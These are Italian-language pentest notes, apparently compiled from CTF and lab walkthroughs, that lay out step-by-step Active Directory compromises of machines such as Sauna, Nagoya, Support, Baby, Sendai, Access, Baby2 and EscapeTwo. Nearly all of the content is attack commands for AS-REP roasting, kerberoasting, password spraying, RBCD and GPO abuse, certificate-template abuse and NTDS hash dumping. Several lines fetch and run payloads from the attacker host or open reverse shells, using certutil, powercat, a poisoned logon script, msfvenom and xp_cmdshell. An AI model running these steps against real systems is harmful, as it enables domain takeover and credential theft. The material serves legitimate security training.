##### Exploitations

- [[#ASREP-ROAST]]
	1. [[#Sauna]]
	2. [[#Nagoya]]
- [[#Expired Password]]
	1. [[#Baby]]
	2. [[#Sendai]]
- [[#File Uploads]]
	1. [[#Access]]
- [[#Logon Scripts]]
	1. [[#Baby2]]
- [[#MSSQL]]
	1. [[#EscapeTwo]]
- [[#SMB]]
	1. [[#Enterprise]]
	2. [[#Timelapse]]
	3. [[#Monteverde]]
	4. [[#Hokkaido]]
	5. [[#Vault]]
- [[#Ticket Silver Attacks]]
	1. [[#Breach]]
- [[#Bruteforcing]]
	1. [[#Sweep]]
	2. [[# Attacktive Directory]]
- [[#Redis]]
	1. [[#Vulnnet: Active]]
- [[#Relay Attacks]]
	1. [[#Escape]]
	2. [[#Vault]]
- [[#Reverse Engineering]]
	1. [[#Support]]
- [[#SSRF]]
	1. [[#Return]]
- [[#LDAP]]
	1. [[#Ledger]]
	2. [[#Hutch]]
- [[#NTDS Dumping]]
	1. [[#Resourced]]
- [[#Others]]
	1. [[#Active]]
	2. [[#Forest]]
	3. [[#Administrator]]

##### Privileges Escalation

- **AutoLogon Credentials**
	1. [[#Sauna]]
- **ESC**
	1. [[#Escape]]
	2. [[#EscapeTwo]]
- **GenericAll**
	1. [[#Support]]
	2. [[#Baby2]]
	3. [[#Administrator]]
	4. [[#Nagoya]]
- **DCSync**
	1. [[#Sauna]]
- **Groups**
	1. [[#Timelapse]]
	2. [[#Return]]
	3. [[#Escape]]
	4. [[#Monteverde]]
* **Abugin Permissions**
	1. [[#Acces]]
	2. [[#Nagoya]]
	3. [[#Hutch]]

## ASREP-ROAST
### Sauna

| **üß† Azione**              | **üíª Comando / Metodo**                                                                                                                                                                              | **üìù Output / Scopo**                                                                                                                                                                                                                                                         |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Username-anarchy**       | 1. `./username-anarchy --input-file names.txt  --select-format first,flast,first.last,firstl > final.txt`                                                                                            | Troviamo dei nomi e cognomi sulla pagina principale. Utilizziamo la *1.* per fare una combinazione di quei nomi                                                                                                                                                               |
| **ASREP-ROAST**            | 1. `impacket-GetNPUsers -no-pass -usersfile names.txt DOMAIN/`<br>2. `john hash --wordlist=rockyou.txt`<br>3. `evil-winrm -u 'fsmith' -p 'Thestrokes23' -i IP_TARGET`                                | Applichiamo la *1.* ed otteniamo il ticket dell'utente `fsmith` che cracchiamo con la *2.* ed infine utilizziamo la *3.* per entrare con le credenziali                                                                                                                       |
| **Auto Logon Credentials** | 1. `upload winpeas.exe`                                                                                                                                                                              | Caricando `winpeas.exe` sulla macchina vittima tramite la *1.* ed avviandolo notiamo che ci sono delle credenziali di *AutoLogon* per l'utente di servizio `svc_loanmgr`                                                                                                      |
| **Bloodhound**             | 1. `bloodhound-python -u 'username' -p 'pass' -ns <rhost> -d <domain-name> -c all`<br>2. `neo4j console`<br>3. `bloodhound`                                                                          | Scarichiamo tutte le info inerenti ad AD in locale per studiarle con Bloodhound                                                                                                                                                                                               |
| **DCSync**                 | 1. ![[Pasted image 20250827220705.png]]<br>2. `impacket-secretsdump egotistical-bank/svc_loanmgr@IP_TARGET -just-dc-user Administrator`<br>3. `evil-winrm -u 'Administrator' -H 'HASH' -i IP_TARGET` | Cercando l'utente `svc_loanmngr` e andando su SHORTEST PATH TO DOMAIN ADMINS che ci consiglia un *DCSync Attack* come nella *1.*.<br>Applichiamo la *2.* ed otteniamo l'hash dell'amminsitratore, prendiamone solo l'ultima parte ed entriamo come amministratori con la *3.* |

- [writeup](https://medium.com/@josephalan17201972/hackthebox-sauna-write-up-d4b25c0d6cce)

### Nagoya

| **üß† Azione**                 | **üíª Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                         |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Username-anarchy**          | 1. `./username-anarchy -users > users.txt`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Troviamo dei nomi e cognomi sulla pagina principale. Utilizziamo la *1.* per fare una combinazione di quei nomi con [username-anarchy](https://github.com/urbanadventurer/username-anarchy.git?source=post_page-----afb50d51bb0f---------------------------------------)                                                                                                                                      |
| **User Enumeration**          | 1. `kerbrute userenum --dc IP_TARGET -d nagoya-industries.com domain-users.txt`<br>2. `cat users2 \| awk '{print $7}' \| cut -d "@" -f 1 > domainusers.txt`                                                                                                                                                                                                                                                                                                                                                                                                                 | Utilizziamo la wordlist di nomi creati adesso per vedere quali utenti sono validi con la *1.*, mentre con la *2.* prendiamo solo in nomi che ci servono                                                                                                                                                                                                                                                       |
| **Password spraying**         | 1. `crackmapexec smb IP_TARGET -u domainusers.txt -p PASS`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Utilizziamo la *1.* per fare password spraying con la password ed otteniamo le credenziali `andrea.hayes:Nagoya2023` e `fiona.clark:Summer2023`                                                                                                                                                                                                                                                               |
| **BloodHound**                | 1. `bloodhound-python -u andrea.hayes -p Nagoya2023 -ns IP_TARGET -d nagoya-industries.com -c all`<br>2. `neo4j start`<br>3. `bloodhound`                                                                                                                                                                                                                                                                                                                                                                                                                                   | Utilizzando la *1.* otteniamo tutta la struttura dell'AD                                                                                                                                                                                                                                                                                                                                                      |
| **GenericAll**                | 1. ![[Pasted image 20250922170617.png]]<br>2. ![[Pasted image 20250922170827.png]]<br>3. `rpcclient -U "fiona.clark%Summer2023" IP_TARGET`<br>4. *TARGET:* `setuserinfo2 svc_helpdesk 23 Password1`<br>5. `rpcclient -U "svc_helpdesk%Password1" IP_TARGET`<br>6. *TARGET:* `setuserinfo2 christopher.lewis 23 Password1`                                                                                                                                                                                                                                                   | Abbiamo il controllo dell'utente `fiona.clark` che come si deduce dall'immagine *1.* appartiene ad un gruppo che ha i permessi per cambiare la password dell'utente `svc_helpdesk`. Dalla *2.* si deduce che `svc_helpdesk` a sua volta ha il controllo sull'utente `christopher.lewis`.<br><br>Dunque cambiamo con la *3.*,*4.* la password al primo utente con la *5.* e *6.* la password al secondo utente |
| **Kerberoasting**             | 1. `GetUserSPNs.py -dc-ip IP_TARGTE nagoya-industries.com/fiona.clark:Summer2023 -request -outputfile spn_hash`<br>2. `hashcat -m 13100 spn_hash /usr/share/wordlists/rockyou.txt`                                                                                                                                                                                                                                                                                                                                                                                          | Con la *1.* applichiamo kerberoasting e con la *2.* cracchiamo le credenziali trovando l'utente `svc_mssql:Serice1`                                                                                                                                                                                                                                                                                           |
| **Forwarding ports**          | 1. `netstat -ano`<br>2. `./chisel server --socks5 --reverse -p 139`<br>3. *TARGET* `upload /opt/tools/chisel.exe`<br>4. *TARGET* `cmd /c "chisel client IP_KALI:139 R:1433:127.0.0.1:1433"`                                                                                                                                                                                                                                                                                                                                                                                 | Adesso che sappiamo che esiste l'utente `svc_mssql` allora √® probabile che ci sia una porta associata al servizio. Troviamo la porta `1433` aperta con la *1.* e poich√© non appare dalla scansione di nmap, deduciamo che non sia accessibile dall'esterno. Utilizziamo la *2.* per avviare un server `chisel` e la *3.*,*4.* per forwardare la porta                                                         |
| **Impersonate Adminsitrator** | 1. `mssqlclient.py svc_mssql:Service1@127.0.0.1 -windows-auth`<br>2. `Import-Module ActiveDirectory`<br>3. `Get-ADDomain`<br>4. `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`<br>5. `echo -n 'PASS' \| iconv -t UTF-16LE \| openssl md4`<br>6. `ticketer.py -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator`<br>7. `export KRB5CCNAME=/root/Desktop/nagoya/Administrator.ccache` | Con la *1.* ci connettiamo al database ma non troviamo nulla di interessante.<br>Poich√© `svc_mssql` √® un utente di servizio allora possiamo utilizzare la *2.*,*3.* e *4.* per ottenere i ticket TGT degli altri utenti. Abbiamo la password di `svc_mssql` ma dobbiamo convertirlo in hash tramite il comando *5.*, adesso possiamo utilizzare la *6.*,*7.* per utilizzare fare un ticket attack             |
| **krb5-user configuration**   | 1. `apt install krb5-user`<br>2. ![[Pasted image 20250922193006.png]]<br>3. ![[Pasted image 20250922193017.png]]<br>4. `mssqlclient.py -k nagoya.nagoya-industries.com`<br>5. ![[Pasted image 20250922193534.png]]                                                                                                                                                                                                                                                                                                                                                          | Installiamo con la *1.* il servizio che ci serve e con la *2.*,*3.* configuriamolo. Infine con la *4.* effettuiamo l'accesso e possiamo notare dalla *5.* che abbiamo attivato il flag `SeImpersonatePrivilege`                                                                                                                                                                                               |
| **Potato**                    | 1. `certutil.exe -urlcache -split -f http://IP_KALI/SigmaPotato.exe C:\Temp\SigmaPotato.exe`<br>2. `xp_cmdshell "C:\Temp\SigmaPotato.exe --revshell IP_KALI 445"`                                                                                                                                                                                                                                                                                                                                                                                                           | Poich√© √® presente il flag `SeImpersonatePrivilege` possiamo scaricare [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato.git) e caricarlo con la *1.* sulla macchina target ed infine avviare una reverse shell con la *2.*                                                                                                                                                                             |


- [writeup](https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f)
## Reverse Engineernig

### Support

| **üß† Azione**          | **üíª Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                      |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Riconoscimento CMS** | 1. `smbclient -L //IP_TARGET/SHARED_FOLDER -N`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Ci colleghiamo a samba e troviamo un *UserInfo.zip*. Unzippandolo e controllandolo con Visual Studio per file in C# riusciamo a decriptare la password interna con l'aiuto del compilatore [Prommiz](https://www.programiz.com/csharp-programming/online-compiler/)<br><br>Le credenziali sono `ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` |
| **LDAP**               | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Scarichiamo le informazioni dell'oggetto *User* utilizzando l e credenziali appena ottenute                                                                                                                                                                                                                                                |
| **Bloodhound**         | 1. `bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all`<br>2. `neo4j console`<br>3. `bloodhound`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | Scarichiamo tutte le info inerenti ad AD in locale per studiarle con Bloodhound                                                                                                                                                                                                                                                            |
| **GenericAll**         | 1. `evil-winrm -i IP_TARGET -u USER -p PASS`<br>2. `upload PowerView.ps1`<br>3. `upload PowerMad.ps1`<br>4. `upload Rubeus.exe`<br>5. `./PowerView.ps1`<br>6. `Import-Module PowerMad.ps1`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Da Bloodhound notiamo che l'utente `support` appartiene al gruppo `Support@support.htb` che a sua volta ha permessi `GenericAll` sulla macchina target. Secondo questo [link](https://bloodhound.specterops.io/resources/edges/generic-all) possiamo creare un utente macchina per impersonare utenti privilegiati come l'amministratore   |
| **Exploit**            | 1. `New-MachineAccount -MachineAccount antoniofake -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)`<br>2. `$computersid = Get-DomainComputer antoniofake \| Select-Object -ExpandProperty objectsid`<br>3. `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($computersid))"`<br>4. `$SDBytes = New-Object byte[] ($SD.BinaryLength)`<br>5. `$SD.GetBinaryForm($SDBytes, 0)`<br>6. `Set-DomainObject -Identity "TargetComputer$" -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}`<br>7. `.\Rubeus.exe hash /password:Password123 /user:antoniofake /domain:support.htb`<br> | Copiamo i comandi suggeriti da BloodHound:<br>*1.* creazione account macchina fittizio<br>*2.* otteniamo il SID della macchina creata<br>*3.* Creare il RawSecurityDescriptor<br>*4.* e *5.* conversione in byte<br>*6.* Applicare RBCD al pc vulnearbile<br>*7.* Richiedere il TGS                                                        |
| **Administrator**      | 1. `base64 -d "base64" > ticket`<br>2. `impacket-ticketConverter ticket ticket.ccache`<br>3. `export CCNAME=ticket.ccache`<br>4. `impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass`                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Incolliamo il base64 dell'amministratore su un file e convertiamo a ccache; infine usiamo il ccache per effettuare l'accesso come amministratori                                                                                                                                                                                           |

- [writeup](https://medium.com/@aperez421/support-htb-writeup-windows-d1a8f6a658aa)

## Expired Password

### Baby

| üß† Azione                  | üíª Comando Chiave                                                                                                                                                                                                                                                                                                                                                                                                                                                         | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **LDAP User Enumeration**  | 1. `ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://IP_TARGET \| grep userPrincipalName`                                                                                                                                                                                                                                                                                                                                                                                   | Dopo una enumerazione iniziale notiamo che la porta `389` dove √® presente il servizio *LDAP*; possiamo applicare la *1.* per enumerare gli utenti presenti sull'AD.                                                                                                                                                                                                                                                                                                                                    |
| **Comments Users**         | 1. `nxc ldap IP_TARGET -u '' -p '' --users -M get-desc-users`                                                                                                                                                                                                                                                                                                                                                                                                             | Utilizziamo la *1.* per elencare i commenti degli oggetti utente dell'AD dove troviamo una password `BabyStart123!`                                                                                                                                                                                                                                                                                                                                                                                    |
| **Password Expired**       | 1. `nxc smb IP_TARGET -u users.txt -p 'BabyStart123!'`<br>2. `apt install krb5-user`<br>3. ```[libdefaults]  <br>default_realm = BABY.VL  <br>dns_lookup_realm = false  <br>ticket_lifetime = 24h  <br>renew_lifetime = 7d  <br>rdns = false  <br>kdc_timesync = 1  <br>ccache_type = 4  <br>forwardable = true  <br>proxiable = true  <br>[realms]  <br>BABY.VL = {  <br>kdc = BABYDC.BABY.VL  <br>admin_server = BABYDC.BABY.VL }```<br>4.  `kpasswd caroline.robinson` | Con la *1.* proviamo le credenziali trovate su tutti gli utenti e notiamo la scritta `STATUS_PASSWORD_MUST_CHANGE` per l'utente `caroline.robinson`. Poich√© la password √® scaduta ed abbiamo la vecchia password, possiamo cambiarla nel seguente modo:<br>Installiamo `krb5-user` con la *2.* e cambiare il file `/etc/krb5-user` come nella *3.*. Usiamo la *4.* per rinnovare la password<br>                                                                                                       |
| **Connection**             | 1. `nxc winrm IP_TARGET -u 'caroline.robinson' -p 'NuovaPass123!'`                                                                                                                                                                                                                                                                                                                                                                                                        | Una volta cambiata la password utilizziamo la *1.* per connetterci                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **Backup Operators Group** | 1. `whoami /priv`<br>2. ```set verbose on  <br>set metadata C:\Windows\Temp\meta.cab  <br>set context clientaccessible  <br>set context persistent  <br>begin backup  <br>add volume C: alias cdrive  <br>create  <br>expose %cdrive% E:  <br>end backup```<br>3. `upload script.txt`<br>4. `diskshadow /s script.txt`<br>5. `robocopy /b E:\Windows\ntds . ntds.dit`<br>6. `reg save hklm\system system.bak`<br>7. `download system.bak`<br>8. `download ntds.dit`<br>   | Con la *1.* vediamo i privilegi dell'account e troviamo `SeBackupPrivilege` e ci√≤ √® vulnerabile poich√© possiamo backuppare anche info importanti. Dobbiamo caricare uno script che backuppi il filesystem e ci permetta di ottenere il file `ntds.dit` contenete gli NTLM.<br>Uploadiamo il file *3.* e con la *4.* backuppiamo tutto e spostiamo il file gli hash con la *5.*. Adesso ci serve il file `system.bak`  che sta nel file di registro, per decriptare gli hash quindi utilizziamo la *6.* |
| **Secretsdump**            | 1. `secretsdump.py -ntds ntds.dit -system system.bak -hashes lmhash:nthash LOCAL`<br>2. `evil-winrm -i 10.10.127.19 -u administrator -H 'ee4457ae59f1e3fbd764567d9cef123d'`                                                                                                                                                                                                                                                                                               | Dumpiamo gli hash con la *1.*. Infine entriamo utilizzando NTLM dell'amministratore con la *2.*                                                                                                                                                                                                                                                                                                                                                                                                        |

- [writeup](https://medium.com/@iamroot101/baby-vulnlab-writeup-70a4aaebb84f)

### Sendai

https://raw.githubusercontent.com/micahvandeusen/gMSADumper/refs/heads/main/gMSADumper.py

| **üß† Azione**                   | **üíª Comando Chiave**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Samba**                       | 1. `smbclient -L //sandai.vl -N`<br>2. `nxc smb dc.sendai.vl -u users.txt -p '' --continue-on-success`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | Dentro la cartella `/sendai` otteniamo una lista di nomi che utilizziamo con la *2.* per capire quali utenti hanno accesso a samba senza uso di credenziali.                                                                                                                                                                                                                                                                                             |
| **MUST CAHGEN PASS**            | 1. `wget https://lira.epac.to/DOCS/python3-impacket/examples/smbpasswd.py`<br>2. `python2 smbpasswd.py sendai.vl/Thomas.Powell@dc.sendai.vl -newpass 'newPass123!'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Notiamo che l'utente `thomas.powell` ha la password scaduta e la deve aggiornare. Utilizziamo la *1.* per scaricare il tool `smbpasswd.py` e la *2.* per cambiare la password. Utilizzando la *3.* controlliamo le cartelle accessibili con la nuova utenza e trovamo `config` dove al suo interno contiene un file aventi le credenziali `sqlsvc:SurenessBlob85`                                                                                        |
| **Bloodhound**                  | 1. `git clone https://github.com/dirkjanm/BloodHound.py.git`<br>2. `cd BloodHound.py`<br>3. `python3 bloodhound.py -u sqlsvc -p PASS -d sendai.vl -c all -dc dc.sendai.vl -ns IP_TARGET`<br>4. `neo4j console`<br>5 `boodhound`                                                                                                                                                                                                                                                                                                                                                                                                                          | Utilizziamo `bloodhound.py` per prendere informazioni dell'AD target.                                                                                                                                                                                                                                                                                                                                                                                    |
| **Generic All**                 | 1. `bloodyAD --host "IP_TARGET" -d 'sendai.vl' -u 'thomas.powell' -p 'newPass123!' add groupMember ADMSVC thomas.powell`<br>2. ```wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper<br>/refs/heads/main/gMSADumper.py```<br>3. `python3 gMSADumper.py -u 'thomas.powell' -p '$aduwu123' -d sendai.vl -l IP_TARGET`<br>4. `evil-winrm -i IP_TARGET -u USER -H NLTM`                                                                                                                                                                                                                                                                        | Dall'analisi notiamo che  che `thomas.powell` appartiene al gruppo `support` che ha privilegi *GenericAll* sul gruppo amministratore `admsvc`. Con questi permessi possiamo aggiungere il nostro utente al gruppo amminsitratori. Utilizziamo la *1.* per inserire il nostro utente nel gruppo. Scarichiamo gMSADumper.py con la *2.* ed avviamolo con la *3.* per scaricare gli NTLM degli altri utenti. Con la *3.* effettuiamo l'accesso tramite NTLM |
| **PrivescCheck.p1 Credentials** | 1. `wget https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1`<br>2. `upload PrivescCheck.ps1`<br>3. `Import-Module PrivescCheck.ps1`<br>4. `Invoke-PrivescCheck`                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Scarichiamo con la *1.* `PrivescCheck.ps1`. Carichiamo sulla macchina taget con la *2.* ed usiamo la *3.* e la *4.* per avviarla. Otteniamo le credenziali di `cliff.devay`                                                                                                                                                                                                                                                                              |
| ****                            | 1. `certipy-ad template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.10.125.227 -template SendaiCompute`<br>2. `certipy-ad req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.10.125.227 -ca sendai-DC-CA -template SendaiComputer -upn Administrator 2>/dev/null'<br>3. `certipy-ad auth -username Administrator -dc-ip 10.10.125.227 -pfx administrator.pfx -domain sendai.vl 2>/dev/null`<br>4. `impacket-getTGT sendai.vl/administrator@10.10.125.227 -hashes aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a`<br>5. `KRB5CCNAME=administrator@10.10.125.227.ccache impacket-secretsdump -k -no-pass dc.sendai.vl -just-d` | Con la *1.* modifichiamo il template di certificato vulnerabile ESC4. Con la *2.* richiediamo il certificato per impersonare l'amminsitratore. Con la *3.* effettuiamo l'accesso<br>*4.* otteniamo il TGT. Con la *5.* facciamo il dump                                                                                                                                                                                                                  |


- [writeup](https://arz101.medium.com/vulnlab-sendai-a7eb5cad15fd)
- [writeup](https://intrusionz3r0.gitbook.io/intrusionz3r0-writeups/laboratories/vulnlabs/sendai)

## File Uploads

### Access

| **üß† Azione**                 | **üíª Comando Chiave**                                                                                                                                                                                                                                             | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                            |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **htaccess File Overwriting** | 1. ![[Pasted image 20250909104011.png]]                                                                                                                                                                                                                           | Da un fuzzing directories scopriamo la cartella `/uploads` sui cui vengono salvati i file caricati. Provando a caricare un file di formato `.php` ci restituisce errore, dunque con la *1.* sovrascriviamo il file `.htaccess` inserendo che possono essere caricati anche i file di formato `.php`.<br>Adesso avviamo una reverse shell in formato PHP                                                          |
| **SPN**                       | 1. `powershell.exe -ep bypass`<br>2. *TARGET*`certutil -urlcache -split -f http://IP_KALI/Get-SPN.ps1`<br>3. *TARGET*`.\Get-SPN.ps1`                                                                                                                              | Avviamo una shell con bypass del firewall con la *1.*, carichiamo lo script [Get-SPN.ps1](https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1) sulla macchina target con la *2.*, infine avviamolo con la *3.*; in questo modo listeremo tutti gli utenti di servizio.                                                                                                                               |
| **Kerberoasting**             | 1. `Invoke-Kerberoast -OutputFormat Hashcat`<br>2. `john hash --wordlist=rockyou.txt`                                                                                                                                                                             | Carichiamo lo script [Invoke-Kerberoast.p1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) sulla macchina target ed utilizziamo la *1.* per ottenere gli hash degli utenti. Utilizziamo la *2.* per craccare la password. Entriamo come utente `svc_mssql:trustno1`                                                                                   |
| **Reverse**                   | 1. `import-module ./Invoke-RunasCs.ps1`<br>2. ```Invoke-RunasCs -Username svc_mssql -Password trustno1 <br>-Command "Powershell IEX(New-Object System.Net.WebClient).<br>DownloadString('http://IP_KALI/powercat.ps1');<br>powercat -c IP_KALI -p 5555 -e cmd"``` | Usiamo [Invoke-RunasCs.ps1](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1) e [powercat.ps1](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1). Utilizziamo la *1.* e *2.* per avviare una reverse shell                                                                                                                                                             |
| **SeManageVolumePrivilege**   | 1. `.\SeManageVolumeExploit.exe`<br>2. *KALI*`msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=4545 -f dll -o shell.dll`<br>3. `C:\Windows\System32\wbem\shell.dll`                                                                           | Tra i permessi dell'utente abbiamo *SeManageVolumePrivilege* ma √® disabilitato.<br>Carichiamo sulla macchina target [SeManageVolumeExploit.exe](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public) e poi avviamolo con la *1.* in modo da attivare i suddetti permessi. Creiamo una reverse shell con la *2.* e carichiamola sulla macchina target, infine usiamo la *3.* per avviarlo<br><br> |

- [writeup](https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9)


## Logon Scripts
### Baby2

| **üß† Azione**              | **üíª Comando Chiave**                                                                                                                                                                                                                                                                                                                               | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                           |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Samba**              | 1. `for user in $(cat users.txt); do crackmapexc smb IP_TARGET -u $user -p $pass; done`                                                                                                                                                                                                                                                         | Entrando nella cartella *samba* possiamo notare una lista di utenti. Utilizziamo la *1.* per fare *password spraying* utilizzando lo username anche come password. Troviamo che le credenziali `library:library` e `Amelia.Griffiths:Amelia.Griffiths` funzionano                                                                                                           |
| **Bloodhound**         | 1. `git clone https://github.com/dirkjanm/BloodHound.py.git`<br>2. `cd BloodHound.py`<br>3. `python3 BloodHound.py/bloodhound.py -d 'baby2.vl' -u 'library' -p 'library' -c all -ns IP_TARGET --zip`                                                                                                                                            | Avendo delle credenziali, possiamo utilizzarle per applicare bloodhound sull'AD con la *3.*                                                                                                                                                                                                                                                                                 |
| **Reverse shell**      | 1.![[d.png]]<br>2. `CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-Object System.Net.WebClient).DownloadString('http://IP_KALI/rev.txt')"`                                                                                                                                                                         | Analizzandoi il pacchetto `.zip` con bloodhounb,  scopriamo che `Amelia.Griffiths` appena effettua l'accesso avvia uno script su cui abbiamo i permessi di scrittura situato su samba (vedere la *1.*).<br>Copiamo il file in locale ed inseriamo la riga *2.* e poi carichiamolo                                                                                           |
| **GPO Object Control** | 1. `whoami /all`<br>2. `Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths`<br>3. `Add-DomainObjectACL -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All`<br>4. `$newcred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`<br>5. `Set-DomainUserPassword gpoadm -AccountPassword $newcred` | Una volta entrari utilizziamo la *1.* e notiamo che l'utente attuale fa parte del gruppo *legacy* che secondo l'analisi su bloodhound, possiamo effettuare del privesc.<br>Con la *2.* assegniamo l'oggetto `gpoadm` all'utente in nostro possesso. Con la *3.* assegniamo a noi stessi i diritti GenericAll. Con la *4.* e *5.* cambiamo la password dell'oggetto `gpoadm` |
| **GPO Policy Object**  | 1. *KALI* `python3 pyGPOAbuse/pygpoabuse.py -dc-ip IP_TARGET -gpo-id "GPO_ID" baby2.vl/gpoadm:'Password123!'`<br>2. *KALI* `evil-winrm -i IP_TARGET -u john -p 'H4x00r123..'`                                                                                                                                                                   | Con la *1.* creiamo un utente nuovo utente admin. Utilizziamo la *2.* per accedervi                                                                                                                                                                                                                                                                                         |

- [writeup](https://dan-feliciano.com/2024/06/05/baby2/)


## MSSQL

### EscapeTwo

| **üß† Azione**          | **üíª Comando Chiave**                                                                                                                                                                                                                                                                                                                                  | **üìù Output / Scopo**                                                                                                                                                                                                                                     |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SMB**                | 1. `for proto in {winrm,mssql,rdp,smb}; do nxc $proto IP_TARGET -u USER -p PASS; done`                                                                                                                                                                                                                                                                 | Con l'utenza iniziale fornita dalle prime fasi, entriamo nel servizio *SMB* dove troviamo il file `accounts.xlsx` in cui troviamo le credenziali di tutti gli utenti.<br>Con la *1.* scopriamo che l'account `sa` ha accesso al servizio MSSQL            |
| **MSSQL**              | 1. `enable_xp_cmdshell`<br>2. `xp_cmdshell powershell -e REV_BASE64`                                                                                                                                                                                                                                                                                   | Una volta entrati sul servizio *MSSQL* utilizziamo la *1.* per attivare il command line e la *2.* per avviare una reverse shell                                                                                                                           |
| **Reused Credentials** |                                                                                                                                                                                                                                                                                                                                                        | Troviamo il file `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` troviamo le credenziali `sql_svc:WqSZAF6CysDQbGb3` con cui abbiamo accesso tramite *WINRM*                                                                                             |
